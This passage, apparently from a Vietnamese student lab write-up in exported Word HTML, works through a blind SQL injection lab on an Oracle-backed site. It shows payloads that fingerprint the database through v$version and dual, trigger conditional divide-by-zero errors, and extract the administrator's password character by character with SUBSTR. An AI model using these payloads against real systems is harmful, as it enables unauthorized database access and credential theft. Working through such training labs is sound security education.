+v:shapes="Picture_x0020_7"><![endif]></span><span style='font-size:16.0pt;
+line-height:106%'><o:p></o:p></span></p>
+
+<p class=MsoNormal><span class=SpellE><span style='font-size:16.0pt;line-height:
+106%'>&#272;ánh</span></span><span style='font-size:16.0pt;line-height:106%'> <span
+class=SpellE>d&#7845;u</span> <span class=SpellE>v&#7883;</span> <span
+class=SpellE>trí</span> payload <span class=SpellE>t&#7841;i</span> $100$<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:16.0pt;line-height:106%;mso-no-proof:
+yes'><!--[if gte vml 1]><v:shape id="Picture_x0020_8" o:spid="_x0000_i1043"
+ type="#_x0000_t75" alt="A screenshot of a computer&#10;&#10;Description automatically generated"
+ style='width:1296.75pt;height:547.5pt;visibility:visible;mso-wrap-style:square'>
+ <v:imagedata src="Lab11%20Blind%20SQL%20injection%20-%20Error%20SQL%20Injection_files/image016.png"
+  o:title="A screenshot of a computer&#10;&#10;Description automatically generated"/>
+</v:shape><![endif]--><![if !vml]><img border=0 width=1729 height=730
+src="Lab11%20Blind%20SQL%20injection%20-%20Error%20SQL%20Injection_files/image017.png"
+alt="A screenshot of a computer&#10;&#10;Description automatically generated"
+v:shapes="Picture_x0020_8"><![endif]></span><span style='font-size:16.0pt;
+line-height:106%'><o:p></o:p></span></p>
+
+<p class=MsoNormal><span class=SpellE><span style='font-size:16.0pt;line-height:
+106%'>T&#7841;i</span></span><span style='font-size:16.0pt;line-height:106%'>
+Payloads <span class=SpellE>&#273;&#7863;t</span> Payload Sets: type Numbers,
+Payload options: 1-100(<span class=SpellE>s&#7869;</span> <span class=SpellE>th&#7917;</span>
+<span class=SpellE>c&#7897;t</span> <span class=SpellE>t&#7915;</span> 1 – <span
+class=SpellE>&#273;&#7871;n</span> 100)<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:16.0pt;line-height:106%;mso-no-proof:
+yes'><!--[if gte vml 1]><v:shape id="Picture_x0020_9" o:spid="_x0000_i1042"
+ type="#_x0000_t75" alt="A screenshot of a computer&#10;&#10;Description automatically generated"
+ style='width:1299pt;height:547.5pt;visibility:visible;mso-wrap-style:square'>
+ <v:imagedata src="Lab11%20Blind%20SQL%20injection%20-%20Error%20SQL%20Injection_files/image018.png"
+  o:title="A screenshot of a computer&#10;&#10;Description automatically generated"/>
+</v:shape><![endif]--><![if !vml]><img border=0 width=1732 height=730
+src="Lab11%20Blind%20SQL%20injection%20-%20Error%20SQL%20Injection_files/image019.png"
+alt="A screenshot of a computer&#10;&#10;Description automatically generated"
+v:shapes="Picture_x0020_9"><![endif]></span><span style='font-size:16.0pt;
+line-height:106%'><o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:16.0pt;line-height:106%'>Ti&#7871;n <span
+class=SpellE>hành</span> attack <span class=SpellE>và</span> <span
+class=SpellE>k&#7871;t</span> <span class=SpellE>qu&#7843;</span> <span
+class=SpellE>mã</span> Status 200 <span class=SpellE>không</span> <span
+class=SpellE>l&#7895;i</span> <span class=SpellE>v&#7899;i</span> payload: 1.
+Nh&#432; <span class=SpellE>v&#7853;y</span> <span class=SpellE>ch&#7881;</span>
+<span class=SpellE>có</span> 1 <span class=SpellE>c&#7897;t</span> <span
+class=SpellE>trong</span> <span class=SpellE>b&#7843;ng</span><o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:16.0pt;line-height:106%;mso-no-proof:
+yes'><!--[if gte vml 1]><v:shape id="Picture_x0020_10" o:spid="_x0000_i1041"
+ type="#_x0000_t75" alt="A screenshot of a computer&#10;&#10;Description automatically generated"
+ style='width:1302pt;height:549pt;visibility:visible;mso-wrap-style:square'>
+ <v:imagedata src="Lab11%20Blind%20SQL%20injection%20-%20Error%20SQL%20Injection_files/image020.png"
+  o:title="A screenshot of a computer&#10;&#10;Description automatically generated"/>
+</v:shape><![endif]--><![if !vml]><img border=0 width=1736 height=732
+src="Lab11%20Blind%20SQL%20injection%20-%20Error%20SQL%20Injection_files/image021.png"
+alt="A screenshot of a computer&#10;&#10;Description automatically generated"
+v:shapes="Picture_x0020_10"><![endif]></span><span style='font-size:16.0pt;
+line-height:106%'><o:p></o:p></span></p>
+
+<p class=MsoNormal><span class=SpellE><b><span style='font-size:16.0pt;
+line-height:106%'>Xác</span></b></span><b><span style='font-size:16.0pt;
+line-height:106%'> <span class=SpellE>&#273;&#7883;nh</span> <span
+class=SpellE>lo&#7841;i</span> <span class=SpellE>c&#417;</span> <span
+class=SpellE>s&#7903;</span> <span class=SpellE>d&#7919;</span> <span
+class=SpellE>li&#7879;u</span> <span class=SpellE>&#273;ang</span> <span
+class=SpellE>s&#7917;</span> <span class=SpellE>d&#7909;ng</span><o:p></o:p></span></b></p>
+
+<p class=MsoNormal><span class=SpellE><span style='font-size:16.0pt;line-height:
+106%'>D&#7921;a</span></span><span style='font-size:16.0pt;line-height:106%'> <span
+class=SpellE>vào</span> <span class=SpellE>b&#7843;ng</span><span
+style='mso-spacerun:yes'>  </span><a
+href="https://portswigger.net/web-security/sql-injection/cheat-sheet">SQL
+injection cheat sheet</a> <span class=SpellE>&#273;ã</span> <span class=SpellE>c&#361;ng</span>
+<span class=SpellE>c&#7845;p</span> <span class=SpellE>&#273;&#7875;</span> <span
+class=SpellE>xác</span> <span class=SpellE>&#273;&#7883;nh</span> <span
+class=SpellE>xem</span> <span class=SpellE>trang</span> web <span class=SpellE>&#273;ang</span>
+<span class=SpellE>s&#7917;</span> <span class=SpellE>d&#7909;ng</span> <span
+class=SpellE>lo&#7841;i</span> <span class=SpellE>c&#417;</span> <span
+class=SpellE>s&#7903;</span> <span class=SpellE>d&#7919;</span> <span
+class=SpellE>li&#7879;u</span> <span class=SpellE>nào</span> <span
+class=SpellE>vì</span> <span class=SpellE>m&#7895;i</span> <span class=SpellE>l&#7885;ai</span>
+database <span class=SpellE>s&#7869;</span> <span class=SpellE>có</span> <span
+class=SpellE>câu</span> <span class=SpellE>l&#7879;nh</span> <span
+class=SpellE>truy</span> <span class=SpellE>v&#7845;n</span> <span
+class=SpellE>khác</span> <span class=SpellE>nhau</span><o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:16.0pt;line-height:106%;mso-no-proof:
+yes'><!--[if gte vml 1]><v:shape id="Picture_x0020_11" o:spid="_x0000_i1040"
+ type="#_x0000_t75" alt="A screenshot of a computer&#10;&#10;Description automatically generated"
+ style='width:1310.25pt;height:553.5pt;visibility:visible;mso-wrap-style:square'>
+ <v:imagedata src="Lab11%20Blind%20SQL%20injection%20-%20Error%20SQL%20Injection_files/image022.png"
+  o:title="A screenshot of a computer&#10;&#10;Description automatically generated"/>
+</v:shape><![endif]--><![if !vml]><img border=0 width=1747 height=738
+src="Lab11%20Blind%20SQL%20injection%20-%20Error%20SQL%20Injection_files/image023.png"
+alt="A screenshot of a computer&#10;&#10;Description automatically generated"
+v:shapes="Picture_x0020_11"><![endif]></span><span style='font-size:16.0pt;
+line-height:106%'><o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:16.0pt;line-height:106%'>Sau <span
+class=SpellE>khi</span> <span class=SpellE>th&#7917;</span> <span class=SpellE>cú</span>
+<span class=SpellE>pháp</span> <span class=SpellE>c&#7911;a</span> <span
+class=SpellE>t&#7915;ng</span> <span class=SpellE>lo&#7841;i</span> <span
+class=SpellE>c&#417;</span> <span class=SpellE>s&#7903;</span> <span
+class=SpellE>d&#7919;</span> <span class=SpellE>li&#7879;u</span> <span
+class=SpellE>t&#7915;</span> <span class=SpellE>b&#7843;ng</span> <span
+class=SpellE>trên</span>. <span class=SpellE>Phát</span> <span class=SpellE>hi&#7879;n</span>
+<span class=SpellE>ra</span> <span class=SpellE>trang</span> web <span
+class=SpellE>s&#7917;</span> <span class=SpellE>d&#7909;ng</span>: </span><b><span
+style='font-size:16.0pt;line-height:106%;font-family:"Arial",sans-serif;
+mso-fareast-font-family:"Times New Roman";color:black;mso-fareast-language:
+JA'>Oracle<o:p></o:p></span></b></p>
+
+<p class=MsoNormal><span class=SpellE><span style='font-size:16.0pt;line-height:
+106%'>TrackingId</span></span><span style='font-size:16.0pt;line-height:106%'>=<span
+style='background:darkgray;mso-highlight:darkgray'>'+UNION+SELECT+*+<span
+class=SpellE>FROM+v$version</span>--</span><o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:16.0pt;line-height:106%;mso-no-proof:
+yes'><!--[if gte vml 1]><v:shape id="Picture_x0020_12" o:spid="_x0000_i1039"
+ type="#_x0000_t75" alt="A screenshot of a computer program&#10;&#10;Description automatically generated"
+ style='width:1313.25pt;height:555pt;visibility:visible;mso-wrap-style:square'>
+ <v:imagedata src="Lab11%20Blind%20SQL%20injection%20-%20Error%20SQL%20Injection_files/image024.png"
+  o:title="A screenshot of a computer program&#10;&#10;Description automatically generated"/>
+</v:shape><![endif]--><![if !vml]><img border=0 width=1751 height=740
+src="Lab11%20Blind%20SQL%20injection%20-%20Error%20SQL%20Injection_files/image025.png"
+alt="A screenshot of a computer program&#10;&#10;Description automatically generated"
+v:shapes="Picture_x0020_12"><![endif]></span><span style='font-size:16.0pt;
+line-height:106%'><o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:16.0pt;line-height:106%;background:
+darkgray;mso-highlight:darkgray'>' +<span class=SpellE>UNION<span
+style='font-family:"MS Gothic";mso-fareast-font-family:"Malgun Gothic";
+mso-bidi-font-family:"MS Gothic";mso-fareast-language:KO'>+</span>SELECT+'a</span>'
++<span class=SpellE>FROM+dual</span>--;</span><span style='font-size:16.0pt;
+line-height:106%'> <span class=SpellE>Xác</span> <span class=SpellE>nh&#7853;n</span>
+<span class=SpellE>lo&#7841;i</span> <span class=SpellE>chu&#7895;i</span> <span
+class=SpellE>c&#7911;a</span> <span class=SpellE><span class=GramE>c&#7897;t</span></span><o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:16.0pt;line-height:106%;mso-no-proof:
+yes'><!--[if gte vml 1]><v:shape id="Picture_x0020_13" o:spid="_x0000_i1038"
+ type="#_x0000_t75" style='width:1318.5pt;height:557.25pt;visibility:visible;
+ mso-wrap-style:square'>
+ <v:imagedata src="Lab11%20Blind%20SQL%20injection%20-%20Error%20SQL%20Injection_files/image026.png"
+  o:title=""/>
+</v:shape><![endif]--><![if !vml]><img border=0 width=1758 height=743
+src="Lab11%20Blind%20SQL%20injection%20-%20Error%20SQL%20Injection_files/image027.png"
+v:shapes="Picture_x0020_13"><![endif]></span><span style='font-size:16.0pt;
+line-height:106%'><o:p></o:p></span></p>
+
+<p class=MsoNormal><span class=SpellE><b><span style='font-size:16.0pt;
+line-height:106%'>Xác</span></b></span><b><span style='font-size:16.0pt;
+line-height:106%'> <span class=SpellE>&#273;&#7883;nh</span> <span
+class=SpellE>tên</span> <span class=SpellE>b&#7843;ng</span> <span
+class=SpellE>và</span> <span class=SpellE>c&#7897;t</span><o:p></o:p></span></b></p>
+
+<p class=MsoNormal><span style='font-size:16.0pt;line-height:106%'>Trong <span
+class=SpellE>tr&#432;&#7901;ng</span> <span class=SpellE>h&#7907;p</span> <span
+class=SpellE>này</span>, <span class=SpellE>mô</span> <span class=SpellE>t&#7843;</span>
+<span class=SpellE>th&#7917;</span> <span class=SpellE>thách</span> <span
+class=SpellE>&#273;ã</span> <span class=SpellE>g&#7907;i</span> ý <span
+class=SpellE>tên</span> <span class=SpellE>b&#7843;ng</span> <span
+class=SpellE>là</span> users <span class=SpellE>và</span> <span class=SpellE>tên</span>
+<span class=SpellE>c&#7897;t</span> <span class=GramE>administrator(</span>username
+<span class=SpellE>&#273;ã</span> <span class=SpellE>c&#7845;p</span>)<span
+class=SpellE>và</span> password. Nh&#432;ng <span class=SpellE>hãy</span> <span
+class=SpellE>ki&#7875;m</span> <span class=SpellE>tra</span> <span
+class=SpellE>k&#7929;</span> <span class=SpellE>b&#7857;ng</span> <span
+class=SpellE>cách</span> <span class=SpellE>t&#7841;o</span> <span
+class=SpellE>truy</span> <span class=SpellE>v&#7845;n</span> <span
+class=SpellE>chính</span> <span class=SpellE>xác</span> (<span class=SpellE>xem</span>
+<span class=SpellE>ph&#7847;n</span> <span class=SpellE>L&#7895;i</span> <span
+class=SpellE>có</span> <span class=SpellE>&#273;i&#7873;u</span> <span
+class=SpellE>ki&#7879;n</span> <span class=SpellE>trong</span> <span
+class=SpellE>B&#7843;ng</span> Cheat):<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:16.0pt;line-height:106%;background:
+darkgray;mso-highlight:darkgray'>‘+UNION+SELECT+CASE+WHEN+(username%3d'administrator<span
+class=GramE>')+</span>THEN+to_char(1/0)+ELSE+NULL+END+FROM+users—</span><span
+style='font-size:16.0pt;line-height:106%'><o:p></o:p></span></p>
+
+<ul style='margin-top:0in' type=disc>
+ <li class=MsoNormal style='mso-list:l6 level1 lfo7;tab-stops:list .5in'><span
+     style='font-size:16.0pt;line-height:106%'>UNION:&nbsp;<span class=SpellE>K&#7871;t</span>
+     <span class=SpellE>h&#7907;p</span> <span class=SpellE>k&#7871;t</span> <span
+     class=SpellE>qu&#7843;</span> <span class=SpellE>c&#7911;a</span> <span
+     class=SpellE>hai</span> <span class=SpellE>ho&#7863;c</span> <span
+     class=SpellE>nhi&#7873;u</span> <span class=SpellE>truy</span> <span
+     class=SpellE>v&#7845;n</span>.<o:p></o:p></span></li>
+ <li class=MsoNormal style='mso-list:l6 level1 lfo7;tab-stops:list .5in'><span
+     style='font-size:16.0pt;line-height:106%'>SELECT CASE
+     WHEN...THEN...ELSE...END:&nbsp;<span class=SpellE>S&#7917;</span> <span
+     class=SpellE>d&#7909;ng</span> <span class=SpellE>câu</span> <span
+     class=SpellE>l&#7879;nh</span> <span class=SpellE>&#273;i&#7873;u</span> <span
+     class=SpellE>ki&#7879;n</span> <span class=SpellE>&#273;&#7875;</span> <span
+     class=SpellE>ki&#7875;m</span> <span class=SpellE>tra</span> <span
+     class=SpellE>xem</span> <span class=SpellE>câu</span> <span class=SpellE>l&#7879;nh</span>&nbsp;<span
+     class=SpellE>có</span>&nbsp;<span class=SpellE>b&#7857;ng</span>
+     &quot;administrator&quot;&nbsp;hay <span class=SpellE><span class=GramE>không.username</span></span><o:p></o:p></span></li>
+ <ul style='margin-top:0in' type=circle>
+  <li class=MsoNormal style='mso-list:l6 level2 lfo7;tab-stops:list 1.0in'><span
+      style='font-size:16.0pt;line-height:106%'>If <span class=GramE>true(</span>):&nbsp;<span
+      class=SpellE>C&#7889;</span> <span class=SpellE>g&#7855;ng</span> <span
+      class=SpellE>th&#7921;c</span> <span class=SpellE>thi</span>,&nbsp;<span
+      class=SpellE>gây</span> <span class=SpellE>ra</span> <span class=SpellE>phép</span>
+      chia <span class=SpellE>cho</span> <span class=SpellE>l&#7895;i</span> 0
+      do chia 1 <span class=SpellE>cho</span> 0.&nbsp;<span class=SpellE>L&#7895;i</span>
+      <span class=SpellE>này</span> <span class=SpellE>có</span> <span
+      class=SpellE>th&#7875;</span> <span class=SpellE>ti&#7871;t</span> <span
+      class=SpellE>l&#7897;</span> <span class=SpellE>thông</span> tin <span
+      class=SpellE>v&#7873;</span> <span class=SpellE>c&#417;</span> <span
+      class=SpellE>s&#7903;</span> <span class=SpellE>d&#7919;</span> <span
+      class=SpellE>li&#7879;u</span> <span class=SpellE>ho&#7863;c</span> <span
+      class=SpellE>h&#7879;</span> <span class=SpellE>th&#7889;ng</span> <span
+      class=SpellE>c&#417;</span> <span class=SpellE><span class=GramE>b&#7843;n.THENto</span>_char</span>(1/0)<o:p></o:p></span></li>
+  <li class=MsoNormal style='mso-list:l6 level2 lfo7;tab-stops:list 1.0in'><span
+      class=SpellE><span style='font-size:16.0pt;line-height:106%'>N&#7871;u</span></span><span
+      style='font-size:16.0pt;line-height:106%'> false ():&nbsp;<span
+      class=SpellE>Tr&#7843;</span> <span class=SpellE><span class=GramE>v&#7873;</span></span><span
+      class=GramE>&nbsp;.ELSENULL</span><o:p></o:p></span></li>
+ </ul>
+ <li class=MsoNormal style='mso-list:l6 level1 lfo7;tab-stops:list .5in'><span
+     style='font-size:16.0pt;line-height:106%'>FROM users:&nbsp;<span
+     class=SpellE>Ch&#7881;</span> <span class=SpellE>&#273;&#7883;nh</span> <span
+     class=SpellE>b&#7843;ng</span> <span class=SpellE>&#273;&#7875;</span> <span
+     class=SpellE>trích</span> <span class=SpellE>xu&#7845;t</span> <span
+     class=SpellE>d&#7919;</span> <span class=SpellE>li&#7879;u</span> <span
+     class=SpellE>t&#7915;</span>.<o:p></o:p></span></li>
+ <li class=MsoNormal style='mso-list:l6 level1 lfo7;tab-stops:list .5in'><span
+     style='font-size:16.0pt;line-height:106%'>--:&nbsp;<span class=SpellE>B&#7845;t</span>
+     <span class=SpellE>c&#7913;</span> <span class=SpellE>&#273;i&#7873;u</span>
+     <span class=SpellE>gì</span> <span class=SpellE>sau</span> <span
+     class=SpellE>&#273;ó</span> <span class=SpellE>&#273;&#432;&#7907;c</span>
+     <span class=SpellE>coi</span> <span class=SpellE>là</span> <span
+     class=SpellE>nh&#7853;n</span> <span class=SpellE>xét</span> <span
+     class=SpellE>và</span> <span class=SpellE>b&#7883;</span> <span
+     class=SpellE>b&#7887;</span> qua, <span class=SpellE>&#273;&#7875;</span> <span
+     class=SpellE>k&#7871;t</span> <span class=SpellE>thúc</span> <span
+     class=SpellE>câu</span> <span class=SpellE>l&#7879;nh</span> <span
+     class=SpellE>truy</span> <span class=SpellE>v&#7845;n</span>.<o:p></o:p></span></li>
+</ul>
+
+<p class=MsoNormal><span class=SpellE><span style='font-size:16.0pt;line-height:
+106%'>Vì</span></span><span style='font-size:16.0pt;line-height:106%'> <span
+class=SpellE>v&#7853;y</span>, <span class=SpellE>vi&#7879;c</span> <span
+class=SpellE>g&#7917;i</span> <span class=SpellE>yêu</span> <span class=SpellE>c&#7847;u</span>
+<span class=SpellE>này</span> <span class=SpellE>s&#7869;</span> <span
+class=SpellE>gây</span> <span class=SpellE>ra</span> <span class=SpellE>L&#7895;i</span>
+500 Internal Server Error<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:16.0pt;line-height:106%;mso-no-proof:
+yes'><!--[if gte vml 1]><v:shape id="Picture_x0020_14" o:spid="_x0000_i1037"
+ type="#_x0000_t75" alt="A screenshot of a computer&#10;&#10;Description automatically generated"
+ style='width:1327.5pt;height:535.5pt;visibility:visible;mso-wrap-style:square'>
+ <v:imagedata src="Lab11%20Blind%20SQL%20injection%20-%20Error%20SQL%20Injection_files/image028.png"
+  o:title="A screenshot of a computer&#10;&#10;Description automatically generated"/>
+</v:shape><![endif]--><![if !vml]><img border=0 width=1770 height=714
+src="Lab11%20Blind%20SQL%20injection%20-%20Error%20SQL%20Injection_files/image029.jpg"
+alt="A screenshot of a computer&#10;&#10;Description automatically generated"
+v:shapes="Picture_x0020_14"><![endif]></span><span style='font-size:16.0pt;
+line-height:106%'><o:p></o:p></span></p>
+
+<p class=MsoNormal><span class=SpellE><span style='font-size:16.0pt;line-height:
+106%'>&#272;ó</span></span><span style='font-size:16.0pt;line-height:106%'> <span
+class=SpellE>chính</span> <span class=SpellE>xác</span> <span class=SpellE>là</span>
+<span class=SpellE>nh&#7919;ng</span> <span class=SpellE>gì</span> <span
+class=SpellE>mu&#7889;n</span>. <span class=SpellE>L&#7895;i</span> <span
+class=SpellE>&#273;&#432;&#7907;c</span> <span class=SpellE>kích</span> <span
+class=SpellE>ho&#7841;t</span> do <span class=SpellE>tên</span> <span
+class=SpellE>ng&#432;&#7901;i</span> <span class=SpellE>dùng</span>
+'administrator' <span class=SpellE>t&#7891;n</span> <span class=SpellE>t&#7841;i</span>
+<span class=SpellE>trong</span> <span class=SpellE>b&#7843;ng</span> <span
+class=SpellE>c&#7911;a</span> <span class=SpellE>ng&#432;&#7901;i</span> <span
+class=SpellE>dùng</span>! <span class=SpellE>Vì</span> <span class=SpellE>v&#7853;y</span>,
+<span class=SpellE>n&#7871;u</span> <span class=SpellE>b&#7845;t</span> <span
+class=SpellE>k&#7923;</span> <span class=SpellE>&#273;i&#7873;u</span> <span
+class=SpellE>ki&#7879;n</span> <span class=SpellE>nào</span> <span
+class=SpellE>là</span> <span class=SpellE>chính</span> <span class=SpellE>xác</span>,
+<span class=SpellE>s&#7869;</span> <span class=SpellE>nh&#7853;n</span> <span
+class=SpellE>&#273;&#432;&#7907;c</span> <span class=SpellE>L&#7895;i</span>
+500 Internal Server Error. <span class=SpellE>Vì</span> <span class=SpellE>v&#7853;y</span>,
+<span class=SpellE>hãy</span> <span class=SpellE>t&#7841;o</span> <span
+class=SpellE>m&#7897;t</span> <span class=SpellE>s&#7889;</span> <span
+class=SpellE>yêu</span> <span class=SpellE>c&#7847;u</span> <span class=SpellE>li&#7879;t</span>
+<span class=SpellE>kê</span> <span class=SpellE>m&#7853;t</span> <span
+class=SpellE>kh&#7849;u</span> <span class=SpellE>c&#7911;a</span>
+administrator.<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:16.0pt;line-height:106%;background:
+darkgray;mso-highlight:darkgray'>'+UNION+SELECT+CASE+WHEN+(username%3d'administrator'+AND+<span
+class=GramE>SUBSTR(</span>password,+1,+1)+&gt;'a')+THEN+to_char(1/0)+ELSE+NULL+END+FROM+user</span><span
+style='font-size:16.0pt;line-height:106%'>--<o:p></o:p></span></p>
+
+<p class=MsoNormal style='margin-left:.25in;text-indent:-.25in;mso-list:l0 level1 lfo8;
+tab-stops:list .25in .5in'><![if !supportLists]><span style='font-size:10.0pt;
+mso-bidi-font-size:16.0pt;line-height:106%;font-family:Symbol;mso-fareast-font-family:
+Symbol;mso-bidi-font-family:Symbol'><span style='mso-list:Ignore'>·<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span></span><![endif]><span style='font-size:16.0pt;line-height:106%'>UNION:&nbsp;<span
+class=SpellE>K&#7871;t</span> <span class=SpellE>h&#7907;p</span> <span
+class=SpellE>k&#7871;t</span> <span class=SpellE>qu&#7843;</span> <span
+class=SpellE>c&#7911;a</span> <span class=SpellE>hai</span> <span class=SpellE>ho&#7863;c</span>
+<span class=SpellE>nhi&#7873;u</span> <span class=SpellE>truy</span> <span
+class=SpellE>v&#7845;n</span>.<o:p></o:p></span></p>
+
+<p class=MsoNormal style='margin-left:.25in;text-indent:-.25in;mso-list:l0 level1 lfo8;
+tab-stops:list .25in .5in'><![if !supportLists]><span style='font-size:10.0pt;
+mso-bidi-font-size:16.0pt;line-height:106%;font-family:Symbol;mso-fareast-font-family:
+Symbol;mso-bidi-font-family:Symbol'><span style='mso-list:Ignore'>·<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span></span><![endif]><span style='font-size:16.0pt;line-height:106%'>SELECT
+CASE WHEN...THEN...ELSE...END:&nbsp;<span class=SpellE>S&#7917;</span> <span
+class=SpellE>d&#7909;ng</span> <span class=SpellE>câu</span> <span
+class=SpellE>l&#7879;nh</span> <span class=SpellE>có</span> <span class=SpellE>&#273;i&#7873;u</span>
+<span class=SpellE>ki&#7879;n</span> <span class=SpellE>&#273;&#7875;</span> <span
+class=SpellE>ki&#7875;m</span> <span class=SpellE>tra</span> <span
+class=SpellE>hai</span> <span class=SpellE>&#273;i&#7873;u</span> <span
+class=SpellE>ki&#7879;n</span>:<o:p></o:p></span></p>
+
+<p class=MsoNormal style='margin-left:.75in;text-indent:-.25in;mso-list:l0 level2 lfo8;
+tab-stops:list .75in'><![if !supportLists]><span style='font-size:10.0pt;
+mso-bidi-font-size:16.0pt;line-height:106%;font-family:"Courier New";
+mso-fareast-font-family:"Courier New"'><span style='mso-list:Ignore'>o<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp; </span></span></span><![endif]><span
+style='font-size:16.0pt;line-height:106%'>username%3d'administrator':&nbsp;<span
+class=SpellE>Ki&#7875;m</span> <span class=SpellE>tra</span> <span
+class=SpellE>xem</span> <span class=SpellE>có</span>&nbsp;<span class=SpellE><b>chính</b></span><b>
+<span class=SpellE>xác</span></b>&nbsp;&quot;administrator&quot;&nbsp;<span
+class=SpellE>là</span> username hay <span class=SpellE>không</span>.<o:p></o:p></span></p>
+
+<p class=MsoNormal style='margin-left:.75in;text-indent:-.25in;mso-list:l0 level2 lfo8;
+tab-stops:list .75in'><![if !supportLists]><span style='font-size:10.0pt;
+mso-bidi-font-size:16.0pt;line-height:106%;font-family:"Courier New";
+mso-fareast-font-family:"Courier New"'><span style='mso-list:Ignore'>o<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp; </span></span></span><![endif]><span
+class=GramE><span style='font-size:16.0pt;line-height:106%'>SUBSTR(</span></span><span
+style='font-size:16.0pt;line-height:106%'>password,+1,+1)+&gt;'a':&nbsp;<span
+class=SpellE>Ki&#7875;m</span> <span class=SpellE>tra</span> <span
+class=SpellE>xem</span> <span class=SpellE>ký</span> <span class=SpellE>t&#7921;</span>
+<span class=SpellE>&#273;&#7847;u</span> <span class=SpellE>tiên</span> <span
+class=SpellE>c&#7911;a</span> <span class=SpellE>m&#7853;t</span> <span
+class=SpellE>kh&#7849;u</span> <span class=SpellE>có</span> <span class=SpellE>l&#7899;n</span>
+<span class=SpellE>h&#417;n</span> &quot;a&quot; hay <span class=SpellE>không</span>.<o:p></o:p></span></p>
+
+<p class=MsoNormal style='margin-left:.75in;text-indent:-.25in;mso-list:l0 level2 lfo8;
+tab-stops:list .75in'><![if !supportLists]><span style='font-size:10.0pt;
+mso-bidi-font-size:16.0pt;line-height:106%;font-family:"Courier New";
+mso-fareast-font-family:"Courier New"'><span style='mso-list:Ignore'>o<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp; </span></span></span><![endif]><span
+class=SpellE><span style='font-size:16.0pt;line-height:106%'>N&#7871;u</span></span><span
+style='font-size:16.0pt;line-height:106%'> <span class=SpellE>c&#7843;</span> <span
+class=SpellE>hai</span> <span class=SpellE>&#273;i&#7873;u</span> <span
+class=SpellE>ki&#7879;n</span> <span class=SpellE>&#273;&#7873;u</span> <span
+class=SpellE>&#273;úng</span> ():&nbsp;<span class=SpellE>C&#7889;</span> <span
+class=SpellE>g&#7855;ng</span> <span class=SpellE>th&#7921;c</span> <span
+class=SpellE>thi</span>,&nbsp;<span class=SpellE>gây</span> <span class=SpellE>ra</span>
+<span class=SpellE>l&#7895;i</span> chia <span class=SpellE>cho</span> 0 do
+chia 1 <span class=SpellE>cho</span> 0.&nbsp;<span class=SpellE>L&#7895;i</span>
+<span class=SpellE>này</span> <span class=SpellE>có</span> <span class=SpellE>th&#7875;</span>
+<span class=SpellE>ti&#7871;t</span> <span class=SpellE>l&#7897;</span> <span
+class=SpellE>thông</span> tin <span class=SpellE>v&#7873;</span> <span
+class=SpellE>c&#417;</span> <span class=SpellE>s&#7903;</span> <span
+class=SpellE>d&#7919;</span> <span class=SpellE>li&#7879;u</span> <span
+class=SpellE>ho&#7863;c</span> <span class=SpellE>h&#7879;</span> <span
+class=SpellE>th&#7889;ng</span> <span class=SpellE>c&#417;</span> <span
+class=SpellE><span class=GramE>b&#7843;n.THENto</span>_char</span>(1/0)<o:p></o:p></span></p>
+
+<p class=MsoNormal style='margin-left:.75in;text-indent:-.25in;mso-list:l0 level2 lfo8;
+tab-stops:list .75in'><![if !supportLists]><span style='font-size:10.0pt;
+mso-bidi-font-size:16.0pt;line-height:106%;font-family:"Courier New";
+mso-fareast-font-family:"Courier New"'><span style='mso-list:Ignore'>o<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp; </span></span></span><![endif]><span
+class=SpellE><span style='font-size:16.0pt;line-height:106%'>N&#7871;u</span></span><span
+style='font-size:16.0pt;line-height:106%'> <span class=SpellE>m&#7897;t</span> <span
+class=SpellE>trong</span> <span class=SpellE>hai</span> <span class=SpellE>&#273;i&#7873;u</span>
+<span class=SpellE>ki&#7879;n</span> <span class=SpellE>là</span> false
+():&nbsp;<span class=SpellE>Tr&#7843;</span> <span class=SpellE><span
+class=GramE>v&#7873;</span></span><span class=GramE>&nbsp;.ELSENULL</span><o:p></o:p></span></p>
+
+<p class=MsoNormal style='margin-left:.25in;text-indent:-.25in;mso-list:l0 level1 lfo8;
+tab-stops:list .25in .5in'><![if !supportLists]><span style='font-size:10.0pt;
+mso-bidi-font-size:16.0pt;line-height:106%;font-family:Symbol;mso-fareast-font-family:
+Symbol;mso-bidi-font-family:Symbol'><span style='mso-list:Ignore'>·<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span></span><![endif]><span style='font-size:16.0pt;line-height:106%'>FROM
+users:&nbsp;<span class=SpellE>Ch&#7881;</span> <span class=SpellE>&#273;&#7883;nh</span>
+<span class=SpellE>b&#7843;ng</span> <span class=SpellE>&#273;&#7875;</span> <span
+class=SpellE>trích</span> <span class=SpellE>xu&#7845;t</span> <span
+class=SpellE>d&#7919;</span> <span class=SpellE>li&#7879;u</span> <span
+class=SpellE>t&#7915;</span>.<o:p></o:p></span></p>
+
+<p class=MsoNormal style='margin-left:.25in;text-indent:-.25in;mso-list:l0 level1 lfo8;
+tab-stops:list .25in .5in'><![if !supportLists]><span style='font-size:10.0pt;
+mso-bidi-font-size:16.0pt;line-height:106%;font-family:Symbol;mso-fareast-font-family:
+Symbol;mso-bidi-font-family:Symbol'><span style='mso-list:Ignore'>·<span
